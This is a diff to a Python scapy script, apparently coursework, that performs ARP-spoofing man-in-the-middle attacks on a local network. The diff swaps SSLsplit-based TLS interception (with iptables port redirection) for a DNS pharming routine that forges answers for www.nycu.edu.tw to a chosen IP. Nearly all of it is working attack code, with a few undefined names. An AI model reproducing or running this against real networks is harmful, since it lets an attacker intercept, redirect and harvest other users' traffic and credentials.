@@ -2,6 +2,7 @@
 
 import netifaces
 import scapy.all as scapy
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
 import time
 import threading
 import os
@@ -28,8 +29,8 @@ def get_mac(ip):
 
     # return 'b4:6b:fc:1d:e8:9f' # error here, use this for temp
 
-def spoof(target_ip, spoof_ip, target_mac):
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
   
     scapy.send(packet, verbose = False)
 
@@ -54,45 +55,23 @@ def translate_to_slash(netmask):
     return 32 - slash
 
 
-# def get_local_info():
-#     # interfaces = netifaces.ifaddresses('wlp3s0')
-#     interfaces = netifaces.ifaddresses('enp0s3')
-#     # dictionary
-#     normal_internet = interfaces[netifaces.AF_INET][0]
-#     address = normal_internet['addr']
-#     netmask = normal_internet['netmask']
-#     broadcast = normal_internet['broadcast']
-#     # slash = IPAddress(netmask).netmask_bits()
-#     slash = translate_to_slash(netmask)
-#     # obtain gateway
-#     gws = netifaces.gateways()
-#     gw = gws['default'][netifaces.AF_INET][0]
-    
-#     return address, netmask, broadcast, str(slash), gw
-
 def get_local_info():
+    # interfaces = netifaces.ifaddresses('wlp3s0')
+    interfaces = netifaces.ifaddresses('enp0s3')
+    # dictionary
+    normal_internet = interfaces[netifaces.AF_INET][0]
+    address = normal_internet['addr']
+    netmask = normal_internet['netmask']
+    broadcast = normal_internet['broadcast']
+    # slash = IPAddress(netmask).netmask_bits()
+    slash = translate_to_slash(netmask)
+    # obtain gateway
+    gws = netifaces.gateways()
+    gw = gws['default'][netifaces.AF_INET][0]
     
-    interfaces = netifaces.interfaces()
+    return address, netmask, broadcast, str(slash), gw
 
-    for interface_name in interfaces:
-        interface = netifaces.ifaddresses(interface_name)
-        try:
-            # dictionary
-            normal_internet = interface[netifaces.AF_INET][0]
-            address = normal_internet['addr']
-            netmask = normal_internet['netmask']
-            broadcast = normal_internet['broadcast']
-            # slash = IPAddress(netmask).netmask_bits()
-            slash = translate_to_slash(netmask)
-            # obtain gateway
-            gws = netifaces.gateways()
-            gw = gws['default'][netifaces.AF_INET][0]
-            return address, netmask, broadcast, str(slash), gw
-        except KeyError:
-            print("this interface: ", interface_name, " isn't feasible")
-            continue
-
-def getDevice(ip, gw):
+def getDevice(ip):
     request = scapy.ARP()
     request.pdst = ip
     broadcast = scapy.Ether()
@@ -102,20 +81,13 @@ def getDevice(ip, gw):
     request_broadcast = broadcast / request
     clients = scapy.srp(request_broadcast, timeout=10, verbose=1)[0]
 
-    result = []
-
     print('Available devices')
     print('----------------------------')
     print('IP         MAC')
     print('----------------------------')
     for element in clients:
-        if element[1].psrc != gw:
-            print(element[1].psrc + "   " + element[1].hwsrc)
-            result_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
-            result.append(result_dict)
+        print(element[1].psrc + "   " + element[1].hwsrc)
     print(' ')
-
-    return result
 
 def get_information(filename, record):
     # parse log
@@ -174,12 +146,6 @@ def sslSplit(stop):
     pathname = os.path.realpath(__file__)
     last = pathname.rfind('/')
     mypath = pathname[:last]
-    # iptable config
-    os.system("sysctl -w net.ipv4.ip_forward=1")
-    os.system("iptables -t nat -F")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
-
     # run sslsplit
     command =   'sslsplit -d -l ' + mypath + '/sslsplit/connections.log'\
             ' -j ' + mypath + '/sslsplit/'\
@@ -196,8 +162,41 @@ def sslSplit(stop):
         for i in onlyfiles:
             record = get_information(logpath + i, record)
         time.sleep(5)
-    
-    # delete iptable
+
+def pharming_callback(pkt):
+    # trigger each capture
+    # http://www.nycu.edu.tw
+    # print("\n")
+    print(pkt.show())
+    # print(type(pkt))
+    # print("\n\n\n")
+    # print("callback")
+    # try:
+    #     question = str(pkt[DNS].qd.qname)
+    # except:
+    #     return
+    # print(question)
+    # if question.find('www.nycu.edu.tw') != -1:
+    #     # find it
+    #     print('find it')
+    #     local_ip = '140.113.207.246'
+    #     spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="trailers.apple.com",rdata=local_ip))
+    #     scapy.send(spf_resp, verbose=0)
+    local_ip = '140.113.207.246'
+    if (
+            DNS in pkt and
+            pkt[DNS].opcode == 0 and
+            pkt[DNS].ancount == 0
+        ):
+            if "www.nycu.edu.tw" in str(pkt["DNS Question Record"].qname):
+                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="www.nycu.edu.tw",rdata=local_ip))
+                send(spf_resp, verbose=0, iface=IFACE)
+                return f"Spoofed DNS Response Sent: {pkt[IP].src}"
+
+def pharming(stop):
+    # port 53 UDP
+    scapy.sniff(filter="udp port 53", count = 0, prn = pharming_callback)
+
 
 
 
@@ -207,50 +206,32 @@ if __name__ == '__main__':
     address, netmask, broadcast, slash, gw = get_local_info()
 
     # print(get_mac('192.168.99.100')) 
-    result = getDevice(address + '/' + slash, gw)
+    getDevice(address + '/' + slash)
 
-    # target_ip = "172.20.10.11" # Enter your target IP
+    target_ip = "172.20.10.11" # Enter your target IP
     # gateway_ip = "192.168.99.1" # Enter your gateway's IP
     gateway_ip = gw
 
 
-    t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
+    # t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
+    t = threading.Thread(target = pharming, args =(lambda : stop_threads, ))
     t.start()
     stop_threads = False
 
     try:
         sent_packets_count = 0
         while True:
-            for index in result:
-                if index['ip'] != gw:
-                    target_ip = index['ip']
-                    target_mac = index['mac']
-                    spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
-                    spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
-                    sent_packets_count = sent_packets_count + 2
-                    print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-                    # time.sleep(0.5) # Waits for two seconds
+            spoof(target_ip, gateway_ip) # cheat on victim to know I am gateway
+            spoof(gateway_ip, target_ip) # cheat on switch to know I am target
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
+            time.sleep(2) # Waits for two seconds
     
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
-        # restore(gateway_ip, target_ip)
-        # restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
         print("[-] Arp Spoof Stopped")
         stop_threads = True
         t.join()
-        os.system("iptables -t nat -F")
         print("stop thread")
-
-    # interface = netifaces.interfaces()[1]
-    # print('=============')
-    # print('Interface Info')
-    # print('=============')
-    # print(netifaces.ifaddresses(interface))
-    # print(' ')
-
-    # request = scapy.ARP()
-    # print('============')
-    # print('Request Info')
-    # print('============')
-    # print(request.summary())
-    # print(' ')
